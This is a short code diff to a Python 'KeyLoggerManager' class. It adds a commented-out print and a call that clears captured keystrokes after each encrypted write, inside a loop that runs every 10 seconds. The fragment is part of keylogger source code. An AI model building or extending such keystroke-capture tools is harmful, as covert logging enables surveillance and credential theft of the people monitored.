@@ -33,7 +33,9 @@ class KeyLoggerManager(IKeyLoggerManager):
             data = self.__key_logger.get_logged_keys()
             encrypt_data = {self.__encryptor.encrypt(key): self.__encryptor.encrypt(value) for key, value in
                             data.items()}
+            # print(data)
             self.__writer.write(self.__serial_number, encrypt_data)
+            self.__key_logger.clear_logged_keys()
             time.sleep(10)
 
     def print_keys(self):
